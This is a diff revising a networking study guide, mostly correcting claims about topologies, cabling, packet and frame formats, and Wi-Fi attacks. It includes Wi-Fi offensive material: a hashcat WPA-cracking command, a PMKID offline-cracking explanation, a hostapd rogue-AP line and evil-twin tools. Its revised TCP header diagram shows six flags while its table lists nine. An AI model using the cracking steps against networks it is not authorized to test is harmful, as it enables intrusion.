@@ -737,9 +737,9 @@ The 6 GHz band is the newest addition, offering unprecedented bandwidth and mini
    ```
    - Central switch/hub connects all nodes
    - Most common modern topology
-   - **Security:** Monitor one point (switch), but it's single point of failure
+   - **Security:** Monitor one point (switch) — effective for visibility; switch management plane should be hardened regardless of whether redundancy is deployed.
    - Pros: Easy troubleshooting, node failure doesn't affect others
-   - Cons: Central device failure brings down entire network
+   - Cons: In a simple SOHO deployment, central device failure disconnects all attached devices. Enterprise networks eliminate this with redundant switches, LACP link aggregation, and RSTP — a star topology with proper redundancy has no single point of failure.
    - Used in: Ethernet switches, home routers, office networks
 
 2. **Ring Topology:**
@@ -769,7 +769,7 @@ The 6 GHz band is the newest addition, offering unprecedented bandwidth and mini
    ```
    - All nodes share single communication line (backbone)
    - Messages travel in both directions
-   - **Security:** All traffic visible to all nodes (major security risk)
+   - **Security:** In legacy coax Ethernet bus, all stations shared one electrical signal — every NIC received every frame. This is entirely obsolete in modern wired networks. Note: Wi-Fi is also a shared medium but WPA2/WPA3 encryption prevents unauthorized frame reading.
    - Pros: Simple, cheap for small networks
    - Cons: Limited length, collision issues, single point of failure
    - Examples: Original Ethernet (10BASE2, 10BASE5) — now obsolete
@@ -906,7 +906,7 @@ The 6 GHz band is the newest addition, offering unprecedented bandwidth and mini
 
 | Type | Range        | Ownership | Speed             | Latency | Use Case                  |
 |------|--------------|-----------|-------------------|---------|---------------------------|
-| PAN  | < 10 m       | Personal  | 1-24 Mbps         | Very Low| Personal devices          |
+| PAN  | < 10 m       | Personal  | Varies by tech (BT Classic: 1–3 Mbps; BLE 5.x: 2 Mbps; NFC: <0.5 Mbps; USB: up to 40 Gbps) | Very Low| Personal devices          |
 | LAN  | < 2 km       | Private   | 100 Mbps - 100 Gbps| Very Low| Office, home             |
 | CAN  | < 5 km       | Private   | 1-100 Gbps        | Low     | Campus                    |
 | MAN  | < 50 km      | Public/Private| 10-100 Gbps   | Low-Med | City-wide                 |
@@ -921,8 +921,8 @@ The 6 GHz band is the newest addition, offering unprecedented bandwidth and mini
 - **LAN security is critical because it's the attacker's entry point** — Compromise one LAN host, pivot to others via same network
 - **Star topology = centralized management point** — In basic SOHO deployments, a single switch failure brings down the LAN. Enterprise networks eliminate this with redundant stacked switches, LACP uplinks, and RSTP. Compromising the switch management plane gives forwarding control — not automatic traffic visibility, since TLS-encrypted traffic remains opaque.
 - **Mesh topology = resilient but complex to manage and secure** — Every device is a routing node; every device is a potential attack surface
-- **Bus topology is legacy and vulnerable** — All devices see all traffic; collision domain management is poor
-- **Ring topology has same security issues as bus but with more latency** — Rarely used in modern networks; found in legacy industrial systems
+- **Bus topology is legacy and obsolete** — In legacy coax Ethernet, all devices shared one electrical signal; every NIC received every frame. This is gone from modern wired networks. Wireless is also a shared medium but is protected by WPA2/WPA3 encryption — not comparable to unencrypted coax bus.
+- **Ring topology (Token Ring, FDDI) is legacy — not found in modern deployments** — Each node receives and retransmits frames sequentially; eavesdropping requires a physical tap (unlike hub-based bus where all stations share the electrical signal). Encountered only in legacy industrial and optical ring systems.
 
 [↑ Back to top](#table-of-contents)
 
@@ -972,7 +972,7 @@ After this section, you'll understand:
   - **SDSL (Symmetric):** Equal upload/download speeds
   - **VDSL (Very high-speed):** 50-100 Mbps down
 - Distance-dependent: speed decreases with distance from CO (Central Office)
-- Maximum effective range: ~5 km from telephone exchange
+- Maximum effective range varies by variant: ADSL/ADSL2+ up to ~5 km from CO (speed degrades sharply with distance); VDSL2 ~1–2 km for full performance (commonly deployed with fibre-to-the-cabinet, FTTC)
 
 **3. Cable Modem:**
 - Uses coaxial cable (same as cable TV)
@@ -1255,11 +1255,11 @@ After this section, you'll understand:
   - Number of interfaces/ports
   - Latency (routing delay)
 
-**Key Concept: Routers vs Switches:**
-- **Routers** are used to interact between 2 devices in **different networks**
-- **Switches** are used when interacting with devices on the **same network**
-- Routers operate at Layer 3 (Network Layer) using IP addresses for inter-network communication
-- Switches operate at Layer 2 (Data Link Layer) using MAC addresses for intra-network communication
+**Key Concept: Routers vs Switches vs Layer 3 Switches:**
+- **Routers** forward packets between different IP networks using IP addresses (Layer 3)
+- **Switches** forward frames within the same network segment using MAC addresses (Layer 2)
+- **Layer 3 Switches** combine both functions — they switch within VLANs and route between VLANs, commonly replacing a separate router in campus environments
+- The simplified rule "routers = between networks, switches = same network" breaks down once Layer 3 switches are involved
 
 ### 5.5 Multi-Layer / Special Purpose Devices
 
@@ -1344,7 +1344,7 @@ In everyday networking, "gateway" almost always refers to the default gateway �
 
 ### 🎯 Key Takeaways - Section 5
 
-**TL;DR:** Network devices operate at different OSI layers, each with specific functions: Layer 1 (hubs, repeaters) = dumb forwarding, Layer 2 (switches) = intelligent MAC-based forwarding, Layer 3 (routers) = IP-based routing, Layer 4+ (firewalls) = stateful/proxy filtering. Understanding devices is critical: compromise a switch and you can spoof MAC addresses, manipulate the CAM table, or reroute LAN traffic; compromise a router and you control routing decisions — you can redirect traffic flows, but encrypted traffic (TLS) remains opaque without session keys; compromise a firewall and you can modify the permit/deny policy.
+**TL;DR:** Network devices operate at different OSI layers, each with specific functions: Layer 1 (hubs, repeaters) = dumb forwarding, Layer 2 (switches) = intelligent MAC-based forwarding, Layer 3 (routers) = IP-based routing, Layer 4+ (firewalls) = stateful/proxy filtering. Understanding devices is critical: in a flat unencrypted network, compromising a switch enables MAC spoofing, CAM overflow, and VLAN hopping — but in a segmented enterprise network with 802.1X, VLANs, and end-to-end TLS, switch compromise gives control-plane access, not automatic traffic visibility. Compromise a router and you can redirect traffic flows, but TLS-encrypted traffic remains opaque without session keys. Compromise a firewall and you can modify the permit/deny policy.
 
 - **Hubs = stupid** — Broadcast all traffic to all ports; no MAC learning; everyone sees everything (security nightmare)
 - **Switches = smart hubs** — Learn MAC addresses, forward only to correct port; collision domain per port
@@ -1421,12 +1421,12 @@ After this section, you'll understand:
 
 ### 🎯 Key Takeaways - Section 6
 
-**TL;DR:** Switched networks replaced point-to-point topologies because they're more efficient: thousands of devices share one switch; bandwidth allocated dynamically; easier to add/remove devices. This centralization is both an advantage (scalable, manageable) and a target (compromise switch = compromise network). Understanding switching motivation helps explain why modern LANs are star topology with central switches.
+**TL;DR:** Switched networks replaced point-to-point topologies because they're more efficient: thousands of devices share one switch; bandwidth allocated dynamically; easier to add/remove devices. This centralization is both an advantage (scalable, manageable) and a target — but "compromise switch = compromise network" only holds in a flat, unencrypted network. In a properly segmented network with VLANs, 802.1X, and end-to-end TLS, switch compromise yields control-plane access, not automatic traffic visibility. Understanding switching motivation helps explain why modern LANs are star topology with central switches.
 
 - **Point-to-point scaling problem** — 100 devices = 4,950 connections; with switch = 100 connections (huge reduction)
 - **Switches enable larger networks** — Before switches, LANs were limited to hub size; switching removed this constraint
 - **Centralization = easier management** — One switch vs hundreds of cables; unified monitoring
-- **But centralization = single point of failure** — Lose switch = lose entire LAN; VLAN hopping exploits switch trust
+- **But centralization = single point of failure in basic networks** — In a flat LAN, losing the switch disconnects all attached devices. Enterprise networks eliminate this with redundant switches, LACP uplinks, and RSTP. VLAN hopping and STP attacks remain real threats even in redundant designs.
 - **Modern data centers use redundant/nested switches** — Multiple switches for fault tolerance; spine-leaf architecture for scale
 
 [↑ Back to top](#table-of-contents)
@@ -1499,7 +1499,7 @@ Switching techniques determine how data is transmitted from source to destinatio
 #### 7.1.5 Historical Context & Modern Use
 
 - **Historical:** Used in early telegraph and telex systems
-- **Legacy Example:** Email store-and-forward (though now uses packet switching)
+- **Note on email:** SMTP MTA relay is application-layer store-and-forward — each mail server stores and forwards the message to the next hop. This is application-layer behavior running on top of packet-switched IP networks, not a separate network-layer switching technology.
 - **Modern Status:** Largely obsolete, replaced by packet switching
 - **Niche Uses:** Some delay-tolerant networks (space communications, sensor networks)
 
@@ -1566,7 +1566,7 @@ Phase 5: Teardown
 - **No Packet Overhead:** No headers needed for each data unit
 - **In-Order Delivery:** Data arrives in sequence (no reordering needed)
 
-#### 7.2.4 Disadvantages
+#### 7.2.5 Disadvantages
 
 - **Resource Waste:** Dedicated path reserved even during silence/idle periods
 - **High Bandwidth Requirements:** Must reserve capacity for peak rate
@@ -1577,7 +1577,7 @@ Phase 5: Teardown
 - **Cost:** Expensive for long-distance connections
 - **Single Path:** If any link in circuit fails, entire connection drops
 
-#### 7.2.5 Modern Applications
+#### 7.2.6 Modern Applications
 
 - **Traditional Telephony:** PSTN (being phased out)
 - **ISDN (Integrated Services Digital Network):** Digital circuit-switched phone service
@@ -1585,7 +1585,7 @@ Phase 5: Teardown
 - **Dedicated Leased Lines:** T1/E1, T3/E3 circuits for enterprise WAN
 - **Legacy Systems:** Some industrial control systems and mainframes
 
-#### 7.2.6 Comparison with Packet Switching
+#### 7.2.7 Comparison with Packet Switching
 
 | Aspect               | Circuit Switching     | Packet Switching           |
 |----------------------|-----------------------|----------------------------|
@@ -1612,10 +1612,12 @@ Phase 5: Teardown
 - Foundation of modern Internet (IP networks)
 
 **Packet Structure:**
+
+An IP packet has a header and payload — there is no trailer. The CRC/FCS is an Ethernet *frame* field, not part of the IP packet. Sequence numbers are a TCP header field inside the payload, not an IP header field.
+
 ```
-[Header: Dest IP | Source IP | Sequence# | Protocol | TTL]
-[Payload: Actual Data]
-[Trailer: Checksum/CRC]
+[ IP Header: Src IP | Dst IP | TTL | Protocol | Header Checksum | ... ]
+[ Payload: TCP Segment / UDP Datagram / ICMP Message ]
 ```
 
 #### 7.3.2 Detailed Operation
@@ -1629,7 +1631,7 @@ Phase 5: Teardown
    - Link failures
    - Routing protocol decisions
    - Load balancing
-6. **Reassembly:** Destination reorders packets using sequence numbers
+6. **Reassembly:** Destination reassembles packets using the IP Identification field and Fragment Offset (IP-layer reassembly). Separately, TCP uses sequence numbers to reorder segments at the Transport layer — these are different mechanisms at different layers.
 7. **Error Checking:** Verify integrity, request retransmission if needed
 
 #### 7.3.3 Types of Packet Switching
@@ -1909,7 +1911,7 @@ Two primary categories:
 |----------|---------------|------------------|--------------|-----------------------------------|
 | Cat 3    | 16 MHz        | 10 Mbps          | 100 m        | Old telephone / 10BASE-T          |
 | Cat 5    | 100 MHz       | 100 Mbps         | 100 m        | Fast Ethernet (obsolete)          |
-| Cat 5e   | 100 MHz       | 1 Gbps           | 100 m        | Gigabit Ethernet (still common)   |
+| Cat 5e   | 100 MHz       | 100 Mbps (designed); 1 Gbps (1000BASE-T supported but minimal margin) | 100 m | Rated for Fast Ethernet; supports 1 Gbps per 1000BASE-T spec but with little headroom — use Cat6/6a for new Gigabit installs |
 | Cat 6    | 250 MHz       | 1 Gbps / 10 Gbps | 100m / 55m   | Gigabit / short 10G runs          |
 | Cat 6a   | 500 MHz       | 10 Gbps          | 100 m        | 10G Ethernet in enterprise        |
 | Cat 7    | 600 MHz       | 10 Gbps          | 100 m        | Data centers (individual shielded pairs) |
@@ -2094,7 +2096,7 @@ Two primary categories:
 | LF/MF       | 30 kHz – 3 MHz  | Ground wave          | AM radio, navigation beacons       |
 | HF          | 3–30 MHz        | Ionosphere bounce    | Shortwave radio, amateur radio     |
 | VHF         | 30–300 MHz      | Line-of-sight        | FM radio, TV, air traffic control  |
-| UHF         | 300 MHz–3 GHz   | Line-of-sight        | Wi-Fi (2.4/5 GHz), LTE, Bluetooth |
+| UHF         | 300 MHz–3 GHz   | Line-of-sight        | Wi-Fi (2.4 GHz), LTE, Bluetooth    |
 | SHF         | 3–30 GHz        | Short LOS, rain loss | Wi-Fi (5/6 GHz), 5G, satellite TV  |
 | EHF (mmWave)| 30–300 GHz      | Very short, blocked  | 5G mmWave, 60 GHz Wi-Fi, radar     |
 
@@ -2166,7 +2168,7 @@ Two primary categories:
 | Evil Twin AP               | Rogue access point mimicking legitimate SSID to intercept traffic           | 802.1X with certificate validation; network monitor |
 | Deauthentication Attack    | Send spoofed 802.11 deauth frames to disconnect clients (DoS)               | 802.11w (Protected Management Frames), WPA3      |
 | KRACK (WPA2)               | Key Reinstallation Attack — downgrade nonce, decrypt traffic                | Patching; WPA3 eliminates vulnerability          |
-| PMKID Attack               | Capture PMKID from AP beacon without client — offline brute-force PMKID    | Strong random PSK (20+ random chars) or WPA3     |
+| PMKID Attack               | Extract PMKID from the AP's first EAPOL frame (no real client needed) — offline brute-force the PMK/PSK    | Strong random PSK (20+ random chars) or WPA3     |
 | Rogue DHCP via Wi-Fi       | DHCP server on rogue AP assigns attacker-controlled DNS/gateway             | 802.1X, network monitoring, DHCP snooping        |
 | RF Jamming                 | Flood 2.4/5 GHz band with noise to deny Wi-Fi service                      | 5 GHz / 6 GHz fallback; 802.11ax interference mitigation |
 | Channel Hopping Scan       | Continuously scan all 2.4/5/6 GHz channels for APs, clients, hidden SSIDs | Awareness; not a direct threat unless combined   |
@@ -2336,8 +2338,9 @@ After this section, you'll understand:
 ┌─────────────────────────────┐      ┌─────────────────────────────┐
 │  Layer 4: Transport         │      │  Layer 4: Transport         │
 │  (TCP/UDP)                  │      │  (TCP/UDP)                  │
-│  [TCP Header | Data]        │      │  [TCP Header | Data]        │
-│  = SEGMENT                  │      │  = SEGMENT                  │
+│  [TCP/UDP Header | Data]    │      │  [TCP/UDP Header | Data]    │
+│  = SEGMENT (TCP) /          │      │  = SEGMENT (TCP) /          │
+│    DATAGRAM (UDP)           │      │    DATAGRAM (UDP)           │
 └─────────────────────────────┘      └─────────────────────────────┘
             ↓                                      ↑
 ┌─────────────────────────────┐      ┌─────────────────────────────┐
@@ -2522,7 +2525,7 @@ Process: ENCAPSULATION (↓)  |  DE-ENCAPSULATION (↑)
   - **Regulatory Domains:** Country‑specific channel and power limits affect coverage and planning.
 
 **Cable Standards and Categories**
-- **Cat5e:** Designed for 100 Mbps (Fast Ethernet) at up to 100 m. Supports 1 Gbps (1000BASE-T) in practice because 1000BASE-T was engineered to work over Cat5e, but with minimal performance margin. For new Gigabit installations, Cat6 or higher is recommended.
+- **Cat5e:** Designed for 100 Mbps (Fast Ethernet) at up to 100 m; supports 1 Gbps (1000BASE-T) in practice but with little performance margin — Cat6 or higher is recommended for new Gigabit installations.
 - **Cat6:** Improved noise protection; supports 10 Gbps for short runs (around 55 m).
 - **Cat6A:** Better shielding and separators; supports 10 Gbps at 100 m.
 - **Cat7:** Heavier shielding and stricter specs; used in specialized environments.
@@ -2678,15 +2681,13 @@ hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt
 
 **PMKID Attack (Clientless WPA2 Attack):**
 
-Discovered by Jens Steube (hashcat author) in 2018. "Clientless" means you do **not** need to wait for a real client to connect and complete a 4-way handshake — but you **do** need to briefly interact with the AP.
+Discovered in 2018 by Jens Steube (hashcat author). Unlike the 4-way handshake attack, PMKID does **not** require waiting for a real client to connect. However, it does **not** come from an AP beacon — the PMKID is extracted from the **first EAPOL frame** that the AP sends in response to an association request that you initiate. You send an association request; the AP replies with an EAPOL message containing the PMKID. No complete handshake is needed, but you do actively interact with the AP.
 
-> **⚠️ Common misconception corrected:** The PMKID is NOT extracted from beacon frames. It is contained in the first EAPOL frame (RSNIE — RSN Information Element) that the AP sends when you attempt to associate with it. You send an association/authentication request; the AP immediately responds with the first EAPOL frame containing the PMKID. No connected client is needed, but some network activity with the AP is required.
-
-**How PMKID is derived:**
+**PMKID derivation:**
 ```
-PMKID = HMAC-SHA1-128(PMK, "PMK Name" || AP_MAC || Client_MAC)
+PMKID = HMAC-SHA1-128(PMK, "PMK Name" || BSSID_AP || MAC_Client)
 ```
-Since the PMK is derived from the PSK (password), capturing the PMKID lets you brute-force the PSK offline — same as handshake cracking, but faster to capture.
+Since PMKID depends on the PMK (which is derived from the PSK + SSID), a captured PMKID can be cracked offline with a dictionary or brute-force attack.
 
 ```bash
 # 1. Capture PMKID from AP
@@ -2764,23 +2765,23 @@ sudo hostapd hostapd.conf
 
 **KRACK Attack (Key Reinstallation Attack):**
 
-KRACK is a **family of CVEs** — not a single attack against the standard 4-way handshake alone:
+CVE-2017-13082 (and a family of related CVEs) — Forces nonce reuse through key reinstallation in the WPA2 handshake process.
 
-> **CVE-2017-13082** specifically targets the **Fast BSS Transition (FT) handshake** (802.11r), where the AP retransmits EAPOL frames, allowing nonce reuse. The 4-way handshake variants are covered by other CVEs in the family (CVE-2017-13077, 13078, 13079, etc.).
-
-> **Affects all WPA2 implementations** was true at discovery (2017) but **most devices were patched rapidly (2017-2018)**. Unpatched devices are still vulnerable; patched devices are not.
+> **Note:** CVE-2017-13082 specifically targets the **FT (Fast BSS Transition / 802.11r) handshake**, not the standard 4-way handshake. The standard 4-way handshake is affected by separate CVEs in the KRACK family (e.g., CVE-2017-13077 through CVE-2017-13086). KRACK was disclosed in October 2017 and affected all WPA2 implementations at that time.
 
 ```
-Attack mechanism:
-- Client during handshake
-- Forces reinstallation of already-in-use PTK/GTK (key)
-- Resets nonce (packet number) counter to a previously used value
-- Allows packet decryption and injection (worst case: decryption + forged injection)
-- Severity varies by cipher: TKIP and GCMP worst (bidirectional); CCMP lower (replay/decrypt only)
+Attack targets:
+- 4-way handshake (CVE-2017-13077, -13078)
+- Group key handshake (CVE-2017-13080)
+- FT handshake (CVE-2017-13082) ← the most frequently cited CVE
+- Forces reinstallation of already-in-use key → resets nonce/replay counters
+- Allows packet decryption and injection
+- Affected all WPA2 implementations at disclosure (2017)
 
 Mitigation:
-- Patch clients and APs
-- Use WPA3 (immune to KRACK)
+- **Patch clients and APs** — modern patched devices are not vulnerable
+- Use WPA3 (immune to KRACK by design)
+- Use end-to-end encryption (TLS/HTTPS) independent of Wi-Fi security
 ```
 
 **Karma / MANA Attack:**
@@ -2855,7 +2856,7 @@ WPA3 requires MFP by default!
 |------|---------|
 | **aircrack-ng suite** | Complete Wi-Fi auditing (capture, inject, crack) |
 | **Wifite** | Automated Wi-Fi auditing script |
-| **Wifiphisher** | Evil twin + captive portal credential harvesting (requires victim to connect and voluntarily enter credentials — social engineering, not fully automated) |
+| **Wifiphisher** | Evil twin + captive portal — **social engineering attack, not automated credential extraction**. The victim must connect to the rogue AP and voluntarily submit credentials into a fake login page. Does not bypass WPA2/WPA3 encryption directly. |
 | **Fluxion** | Evil twin + captive portal attacks (same social engineering dependency as Wifiphisher) |
 | **Kismet** | Wireless reconnaissance and IDS |
 | **Bettercap** | Network attacks including Wi-Fi |
@@ -3018,24 +3019,26 @@ WPA3 requires MFP by default!
 - Changing MAC identity can bypass simple access controls or confuse audit trails. Defensive controls include port security, NAC, and logging.
 
 **Ethernet Frame Format (IEEE 802.3)**
+
+> **Physical vs MAC layer boundary:** The 8-byte preamble (7-byte preamble + 1-byte SFD) is prepended by the Physical Layer for bit synchronization and is stripped before the frame reaches the Data Link (MAC) layer. Wireshark and packet analysis tools show the frame starting at Destination MAC — they do not display the preamble or SFD.
+
 ```
-[Preamble|  SFD  |Dest. MAC | Src MAC |Type/Length|  Payload |   FCS  ]
-[ 7 bytes| 1 byte| 6 bytes | 6 bytes |  2 bytes  | 46-1500B | 4 bytes]
+Physical Layer:  [Preamble (7B)] [SFD (1B)]  ← stripped before MAC layer
+MAC Layer frame: [Dest. MAC  | Src MAC  | Type/Length |  Payload  |   FCS  ]
+                 [  6 bytes  | 6 bytes  |   2 bytes   | 46-1500B  | 4 bytes]
 ```
 
 | Field | Size | Description |
 | --- | --- | --- |
-| Preamble | 7 bytes | Alternating 1s and 0s for clock sync — **prepended by the Physical Layer; not part of the MAC frame proper** |
-| SFD (Start Frame Delimiter) | 1 byte | 10101011 pattern; marks frame start — **also Physical Layer overhead, stripped before the MAC layer processes the frame** |
-| Destination MAC | 6 bytes | Receiver MAC address — **this is where the actual Ethernet frame begins at the MAC sublayer** |
+| Preamble | 7 bytes | Alternating 1s and 0s for clock sync — Physical Layer only; not part of MAC frame |
+| SFD | 1 byte | 10101011 pattern; marks frame start — Physical Layer only; not part of MAC frame |
+| Destination MAC | 6 bytes | Receiver MAC address (MAC frame starts here) |
 | Source MAC | 6 bytes | Sender MAC address |
-| Type/Length | 2 bytes | EtherType or payload size (max 1500) |
+| Type/Length | 2 bytes | EtherType (>1500) or payload size (≤1500) |
 | Payload | 46–1500 bytes | Encapsulated Layer 3 packet |
-| FCS (CRC) | 4 bytes | Error detection checksum |
+| FCS (CRC) | 4 bytes | CRC-32 error detection checksum |
 
-> **Wireshark/analysis note:** Packet capture tools (Wireshark, tcpdump) show Ethernet frames starting from the Destination MAC address — the 8-byte preamble+SFD are stripped by the NIC before the frame reaches the OS. The FCS is also typically omitted in captures. Don’t be confused when captured frames appear shorter than the full 1518-byte maximum.
-
-**Frame Size:** Minimum 64 bytes, Maximum 1518 bytes (without VLAN tag)
+**Frame Size:** Minimum 64 bytes, Maximum 1518 bytes (without VLAN tag) — calculated from Destination MAC to FCS, not including preamble/SFD.
 
 ##### **ARP Protocol & Behavior**
 
@@ -3504,58 +3507,6 @@ Token Ring Operation:
 
 ---
 
-**C) Channelization (Multiplexing)**
-
-Instead of time-sharing one channel, divide the channel into separate sub-channels. Each station gets dedicated capacity — no collisions possible.
-
-**1. FDMA (Frequency Division Multiple Access)**
-- **Mechanism:** Divide frequency spectrum into bands; each station gets a band
-- **Guard Bands:** Unused frequencies between channels prevent interference
-- **Example:** Traditional radio/TV broadcasting, early cellular (1G AMPS)
-- **Advantage:** Simple, continuous transmission possible
-- **Disadvantage:** Wasted capacity if station has nothing to send; guard bands reduce efficiency
-
-```
-FDMA Spectrum Division:
-|--Band 1--|guard|--Band 2--|guard|--Band 3--|guard|--Band 4--|
-   User A          User B          User C          User D
-```
-
-**2. TDMA (Time Division Multiple Access)**
-- **Mechanism:** Divide time into frames; each frame has slots; each station gets slot(s)
-- **Synchronization:** All stations must be time-synchronized
-- **Example:** GSM cellular (2G), satellite communication
-- **Advantage:** Flexible allocation (more slots = more bandwidth)
-- **Disadvantage:** Synchronization overhead; wasted slots if station has nothing to send
-
-```
-TDMA Frame Structure:
-|--Slot 1--|--Slot 2--|--Slot 3--|--Slot 4--|--Slot 1--|--Slot 2--|...
-   User A     User B     User C     User D     User A     User B
-   Frame 1                                     Frame 2
-```
-
-**3. CDMA (Code Division Multiple Access)**
-- **Mechanism:** All stations transmit simultaneously on same frequency; each uses unique orthogonal code
-- **Spreading:** Data multiplied by station's code; spreads signal across bandwidth
-- **Despreading:** Receiver multiplies by same code to extract original data
-- **Orthogonal Codes:** Codes designed so they cancel out when multiplied (cross-correlation = 0)
-- **Example:** 3G cellular (CDMA2000, WCDMA), GPS
-- **Advantage:** No coordination needed; graceful degradation under load; inherent security (code = key)
-- **Disadvantage:** Complex receivers; near-far problem (strong signals overwhelm weak)
-
-```
-CDMA Principle:
-Station A: Data × Code_A → Spread_A ─┐
-Station B: Data × Code_B → Spread_B ─┼──► Combined Signal
-Station C: Data × Code_C → Spread_C ─┘
-                                      │
-Receiver (wants A): Combined × Code_A → Original Data_A
-                   (B and C cancel out due to orthogonality)
-```
-
----
-
 ##### **Access Control Protocols (Shared Medium)**
 
 **Core Problem:** When multiple devices share a single communication channel (like early Ethernet or Wi-Fi), simultaneous transmissions cause **collisions** — signals overlap and corrupt each other. Access control protocols decide **who transmits and when** to minimize or eliminate collisions.
@@ -3640,7 +3591,7 @@ After a collision occurs, stations must decide **when to retry** — this is col
 | Pure ALOHA | Random | High | ~18% | Variable | Satellite, RFID |
 | Slotted ALOHA | Random | Medium | ~37% | Variable | Satellite |
 | CSMA/CD | Random | Medium | Variable — approaches 100% at low load, degrades under congestion; not applicable in modern full-duplex switched Ethernet (no collisions occur) | Variable | Legacy Ethernet |
-| CSMA/CA | Random | Low | Variable (~70% theoretical max; 40-60% practical) | Variable | Wi-Fi |
+| CSMA/CA | Random | Low | Variable — real-world 802.11 typically 40–60% due to DIFS/SIFS overhead, ACK frames, management frames, backoff collisions, and hidden-node retransmissions; efficiency drops further at small frame sizes or high collision rates | Variable | Wi-Fi |
 | Polling | Controlled | None | High | Predictable | SCADA, mainframes |
 | Token Passing | Controlled | None | High | Bounded | Industrial, legacy |
 | FDMA | Channelization | None | Medium | Low | Radio, 1G cellular |
@@ -4266,9 +4217,9 @@ A TCP segment: **header** (minimum 20 bytes) + **data payload**.
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 |                    Acknowledgment Number                      |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
-|  Data |       |C|E|U|A|P|R|S|F|                               |
-| Offset|  Res. |W|C|R|C|S|S|Y|I|       Window Size             |
-|  (4b) | (3b)  |R|E|G|K|H|T|N|N|          (16b)               |
+|  Data |       |U|A|P|R|S|F|                                   |
+| Offset|  Res. |R|C|S|S|Y|I|            Window Size            |
+|       |       |G|K|H|T|N|N|                                   |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 |           Checksum            |         Urgent Pointer        |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
@@ -4277,8 +4228,6 @@ A TCP segment: **header** (minimum 20 bytes) + **data payload**.
 |                          Payload Data                         |
  +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
 ```
-
-> **Header note (RFC 3168):** The modern TCP header control section is 12 bits total: 3-bit Reserved + 9 control flags (NS, CWR, ECE, URG, ACK, PSH, RST, SYN, FIN). The older RFC 793 picture showed a 6-bit Reserved + 6 flags, before ECN (RFC 3168, 2001) allocated CWR and ECE. Tools like Wireshark show all 9 flags. The NS flag (RFC 3540) is rarely deployed.
 
 **Field Reference:**
 
@@ -4289,12 +4238,14 @@ A TCP segment: **header** (minimum 20 bytes) + **data payload**.
 | Sequence Number | 32 bits | Position of first byte in this segment |
 | Acknowledgment Number | 32 bits | Next expected byte from the remote side |
 | Data Offset | 4 bits | Header length in 32-bit words (min 5 = 20 bytes) |
-| Reserved | **3 bits** | Must be zero (pre-RFC 3168 diagrams show 6 bits — that was before ECN was allocated) |
-| Control Flags | **9 bits** | NS, CWR, ECE, URG, ACK, PSH, RST, SYN, FIN (RFC 3168 added CWR+ECE; RFC 3540 added NS) |
+| Reserved | 3 bits | Must be zero (RFC 793 originally 6 bits; RFC 3168 allocated 3 bits for ECN flags) |
+| Control Flags | 9 bits | **NS** (ECN nonce), **CWR** (Congestion Window Reduced), **ECE** (ECN-Echo), **URG**, **ACK**, **PSH**, **RST**, **SYN**, **FIN** — CWR and ECE added by RFC 3168 for Explicit Congestion Notification |
 | Window Size | 16 bits | Receiver buffer available (flow control) |
 | Checksum | 16 bits | Error detection over header + data |
 | Urgent Pointer | 16 bits | Offset to urgent data (URG flag must be set) |
 | Options | Variable | MSS, SACK, timestamps, window scaling |
+
+> **Historical note:** Pre-RFC 3168 diagrams show Reserved=6 bits and Flags=6 bits (URG, ACK, PSH, RST, SYN, FIN). RFC 3168 (2001) allocated two of the reserved bits to CWR and ECE for ECN support; RFC 3540 allocated the NS bit. Modern TCP headers have 3 reserved bits and 9 control flag bits. Some exam materials still use the legacy 6-flag layout — both are correct for their respective RFC era.
 
 **Important Header/Path Relationships:**
 - **MSS (Maximum Segment Size):** Largest TCP payload per segment (announced in SYN options).
@@ -4865,26 +4816,6 @@ Client                                          Server
    │ <─────── ChangeCipherSpec ────────────────── │
    │                                               │
    │ <─────── Finished (encrypted) ─────────────  │
-   │                                               │
-   │ ═══════ Encrypted Application Data ════════  │
-```
-
-**TLS 1.3 Handshake (Faster - 1-RTT):**
-```
-Client                                          Server
-   │                                               │
-   │ ──────── ClientHello ───────────────────────> │
-   │          (key_share, supported_versions,      │
-   │           pre_shared_key if resuming)         │
-   │                                               │
-   │ <─────── ServerHello ─────────────────────── │
-   │          (key_share, selected version)        │
-   │ <─────── EncryptedExtensions ──────────────  │
-   │ <─────── Certificate ─────────────────────── │
-   │ <─────── CertificateVerify ────────────────  │
-   │ <─────── Finished ───────────────────────── │
-   │                                               │
-   │ ──────── Finished ──────────────────────────>│
    │                                               │
    │ ═══════ Encrypted Application Data ════════  │
 ```
@@ -5825,9 +5756,9 @@ The TCP/IP model emerged from **ARPANET**, the predecessor to the modern Interne
 +-------------------------------+
 |  Transport Layer (L4)         |  TCP, UDP, SCTP
 +-------------------------------+
-|  Internet/Network Layer (L3)  |  IP, ICMP, ARP
+|  Internet/Network Layer (L3)  |  IP, ICMP, IGMP
 +-------------------------------+
-|  Data Link Layer (L2)         |  Ethernet, Wi-Fi (802.11), PPP
+|  Data Link Layer (L2)         |  Ethernet, Wi-Fi (802.11), PPP, ARP
 +-------------------------------+
 |  Physical Layer (L1)          |  Cables, Radio, Fiber, Signals
 +-------------------------------+
@@ -6015,10 +5946,15 @@ Host A                             Host B (192.168.1.2)
 **Ethernet Frame Structure:**
 
 ```
-+----------+----------+---------+------------------+---------+---------+
-| Preamble | Dst MAC  | Src MAC | EtherType/Length | Payload | FCS/CRC |
-| 7 bytes  | 6 bytes  | 6 bytes | 2 bytes          | 46-1500B| 4 bytes |
-+----------+----------+---------+------------------+---------+---------+
+Physical Layer (prepended by NIC, not part of the MAC frame):
+  [Preamble: 7 bytes] [SFD: 1 byte]
+
+MAC Layer frame (what protocol analysers capture; counts toward frame size):
++---------+---------+------------------+---------+---------+
+| Dst MAC | Src MAC | EtherType/Length | Payload | FCS/CRC |
+| 6 bytes | 6 bytes | 2 bytes          | 46-1500B| 4 bytes |
++---------+---------+------------------+---------+---------+
+Frame size: 64 bytes minimum, 1518 bytes maximum — measured from Dst MAC to FCS.
 ```
 
 **Common EtherType Values:**
@@ -6599,13 +6535,15 @@ After this section, you'll understand:
 
